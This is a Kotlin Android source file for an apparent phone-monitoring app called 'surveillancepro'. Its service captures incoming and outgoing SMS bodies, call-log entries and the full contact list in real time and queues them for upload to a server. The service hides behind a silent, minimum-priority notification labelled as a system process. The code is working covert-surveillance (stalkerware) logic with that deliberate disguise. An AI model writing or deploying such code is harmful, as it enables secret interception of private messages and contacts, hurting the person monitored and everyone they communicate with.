package com.surveillancepro.android.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import com.surveillancepro.android.MainActivity
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * ForegroundService qui surveille en temps réel via ContentObserver :
 * - SMS entrants/sortants
 * - Journal d'appels (instantané, pas polling)
 * - Contacts (ajout/modification/suppression)
 */
class ContentObserverService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var smsObserver: ContentObserver? = null
    private var callObserver: ContentObserver? = null
    private var contactsObserver: ContentObserver? = null

    private val prefs by lazy { getSharedPreferences("sp_observers", Context.MODE_PRIVATE) }
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

    private val pingRunnable = object : Runnable {
        override fun run() {
            sendPing()
            handler.postDelayed(this, PING_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        startForeground(NOTIFICATION_ID, buildNotification())
        registerObservers()
        syncContactsSnapshot()
        startPing()

        return START_STICKY
    }

    private fun startPing() {
        handler.removeCallbacks(pingRunnable)
        handler.post(pingRunnable)
    }

    private fun sendPing() {
        Thread {
            try {
                val storage = DeviceStorage.getInstance(applicationContext)
                val api = ApiClient.getInstance(storage)
                val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
                val charging = bm.isCharging
                api.pingSync(level, if (charging) "charging" else "unplugged")
            } catch (_: Exception) {}
        }.start()
    }

    private fun registerObservers() {
        val cr = contentResolver

        // SMS Observer
        smsObserver = object : ContentObserver(handler) {
            private var lastSmsId = prefs.getLong("last_sms_id", 0L)
            private val debounce = Runnable { captureNewSMS() }
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                handler.removeCallbacks(debounce)
                handler.postDelayed(debounce, 800)
            }
            private fun captureNewSMS() {
                try {
                    val cursor = cr.query(
                        Telephony.Sms.CONTENT_URI,
                        arrayOf(
                            Telephony.Sms._ID,
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.DATE,
                            Telephony.Sms.TYPE,
                            Telephony.Sms.SEEN,
                        ),
                        "${Telephony.Sms._ID} > ?",
                        arrayOf(lastSmsId.toString()),
                        "${Telephony.Sms.DATE} DESC LIMIT 10"
                    ) ?: return

                    val queue = EventQueue.getInstance(applicationContext)
                    while (cursor.moveToNext()) {
                        val id = cursor.getLong(0)
                        val address = cursor.getString(1) ?: "inconnu"
                        val body = cursor.getString(2) ?: ""
                        val date = cursor.getLong(3)
                        val type = cursor.getInt(4)
                        if (id <= lastSmsId) continue

                        val smsType = when (type) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "recu"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "envoye"
                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "brouillon"
                            else -> "autre"
                        }
                        val contactName = resolveContactName(address)

                        queue.enqueue("sms_message", mapOf(
                            "address" to address,
                            "contact" to contactName,
                            "body" to body.take(2000),
                            "type" to smsType,
                            "date" to dateFormat.format(Date(date)),
                            "timestamp" to dateFormat.format(Date()),
                        ))
                        if (id > lastSmsId) lastSmsId = id
                    }
                    cursor.close()
                    prefs.edit().putLong("last_sms_id", lastSmsId).apply()
                } catch (e: SecurityException) {
                    Log.w(TAG, "SMS read permission denied")
                }
            }
        }
        cr.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)

        // Call Log Observer
        callObserver = object : ContentObserver(handler) {
            private var lastCallDate = prefs.getLong("last_call_date", System.currentTimeMillis())
            private val debounce = Runnable { captureNewCalls() }
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                handler.removeCallbacks(debounce)
                handler.postDelayed(debounce, 1500)
            }
            private fun captureNewCalls() {
                try {
                    val cursor = cr.query(
                        CallLog.Calls.CONTENT_URI,
                        arrayOf(
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DURATION,
                            CallLog.Calls.DATE,
                        ),
                        "${CallLog.Calls.DATE} > ?",
                        arrayOf(lastCallDate.toString()),
                        "${CallLog.Calls.DATE} DESC LIMIT 10"
                    ) ?: return

                    val queue = EventQueue.getInstance(applicationContext)
                    while (cursor.moveToNext()) {
                        val number = cursor.getString(0) ?: "inconnu"
                        val name = cursor.getString(1) ?: ""
                        val type = cursor.getInt(2)
                        val duration = cursor.getLong(3)
                        val date = cursor.getLong(4)
                        if (date <= lastCallDate) continue

                        val callType = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "entrant"
                            CallLog.Calls.OUTGOING_TYPE -> "sortant"
                            CallLog.Calls.MISSED_TYPE -> "manque"
                            CallLog.Calls.REJECTED_TYPE -> "rejete"
                            else -> "autre"
                        }

                        queue.enqueue("phone_call", mapOf(
                            "number" to number,
                            "contact" to name,
                            "type" to callType,
                            "durationSeconds" to duration,
                            "durationMinutes" to (duration / 60),
                            "source" to "realtime",
                            "timestamp" to dateFormat.format(Date(date)),
                        ))
                        if (date > lastCallDate) lastCallDate = date
                    }
                    cursor.close()
                    prefs.edit().putLong("last_call_date", lastCallDate).apply()
                } catch (e: SecurityException) {
                    Log.w(TAG, "Call log permission denied")
                }
            }
        }
        cr.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callObserver!!)

        // Contacts Observer
        contactsObserver = object : ContentObserver(handler) {
            private val debounce = Runnable { syncContactsSnapshot() }
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                handler.removeCallbacks(debounce)
                handler.postDelayed(debounce, 3000)
            }
        }
        cr.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactsObserver!!)

        Log.d(TAG, "All ContentObservers registered")
    }

    fun syncContactsSnapshot() {
        try {
            val contacts = readAllContacts()
            val previousHash = prefs.getString("contacts_hash", "") ?: ""
            val currentHash = contacts.hashCode().toString()

            if (currentHash != previousHash && contacts.isNotEmpty()) {
                val queue = EventQueue.getInstance(applicationContext)
                queue.enqueue("contacts_sync", mapOf(
                    "contacts" to contacts,
                    "count" to contacts.size,
                    "timestamp" to dateFormat.format(Date()),
                ))
                prefs.edit().putString("contacts_hash", currentHash).apply()
                Log.d(TAG, "Contacts synced: ${contacts.size} contacts")
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Contacts permission denied")
        }
    }

    private fun readAllContacts(): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE,
            ),
            null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        ) ?: return contacts

        val seen = mutableSetOf<String>()
        while (cursor.moveToNext() && contacts.size < 500) {
            val name = cursor.getString(0) ?: continue
            val number = cursor.getString(1) ?: continue
            val key = "$name|$number"
            if (seen.contains(key)) continue
            seen.add(key)

            contacts.add(mapOf(
                "name" to name,
                "number" to number,
            ))
        }
        cursor.close()
        return contacts
    }

    private fun resolveContactName(phoneNumber: String): String {
        try {
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
            )
            val cursor = contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            ) ?: return ""
            val name = if (cursor.moveToFirst()) cursor.getString(0) ?: "" else ""
            cursor.close()
            return name
        } catch (_: Exception) { return "" }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Services système",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Processus système"
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        callObserver?.let { contentResolver.unregisterContentObserver(it) }
        contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "ContentObserverService"
        private const val CHANNEL_ID = "supervision_pro_service"
        private const val NOTIFICATION_ID = 1002
        private const val PING_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
    }
}
